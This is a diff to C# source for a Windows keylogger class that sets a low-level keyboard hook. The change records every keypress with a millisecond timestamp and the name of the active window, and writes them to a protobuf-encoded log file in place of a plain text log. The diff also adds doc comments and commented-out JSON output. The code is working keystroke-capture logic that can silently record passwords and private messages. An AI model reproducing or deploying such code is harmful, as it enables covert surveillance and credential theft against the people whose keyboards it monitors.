@@ -4,6 +4,8 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
+using HookKeylogger.Base;
+using Google.Protobuf;
 
 namespace Hooks
 {
@@ -15,6 +17,9 @@ namespace Hooks
         private static IntPtr _hookID = IntPtr.Zero;
         private static String log = "";
 
+        ///<summary>
+        ///Initialize the keylogger.
+        ///</summary>
         public KeyLogger(String logloc)
         {
             log = logloc;
@@ -28,6 +33,9 @@ namespace Hooks
             }
         }
 
+        ///<summary>
+        ///Disconnect the hook.
+        ///</summary>
         public void Deactivate()
         {
             UnhookWindowsHookEx(_hookID);
@@ -41,6 +49,9 @@ namespace Hooks
         [DllImport("user32.dll")]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
+        ///<summary>
+        ///Get the active window name.
+        ///</summary>
         private static string GetActiveWindowName()
         {
             const int numChars = 256;
@@ -51,21 +62,35 @@ namespace Hooks
             {
                 return buffer.ToString();
             }
-            return null;
+            return "";
         }
 
+        ///<summary>
+        /// HookCallback function
+        /// 
+        /// Called each time a Hook Event is fired. If the type of event is a KeyPress append the keypress and metadata to a keypress log.
+        /// This function calls the next hook in the hook chain.
+        ///</summary>
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
+                KeyPress ks = new KeyPress();
+                DateTimeOffset x = new DateTimeOffset(DateTime.Now);
+                ks.Key = Marshal.ReadInt32(lParam);
+                ks.Timestamp = x.ToUnixTimeMilliseconds();
+                ks.ActiveProgram = GetActiveWindowName();
+                
+                // Un-Comment these lines to write the KeyStrokes in the JSON human readable format. C# proto
+                // implementation lacks support for the Text encoding, the json encoding is the most human readable format.
+                //StreamWriter o = new StreamWriter(log+".json");
+                //o.WriteLine(ks.ToString());
+                //o.Close();
+                KeyPressBuffer b = new KeyPressBuffer(log);
+                b.AddKeyPress(ks);
+
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
-                StreamWriter sw = new StreamWriter(log, true);
-                sw.Write((Keys)vkCode);
-                using (Process curProcess = Process.GetCurrentProcess())
-                sw.Write(" - Process Name: "+(GetActiveWindowName()));
-                sw.WriteLine();
-                sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
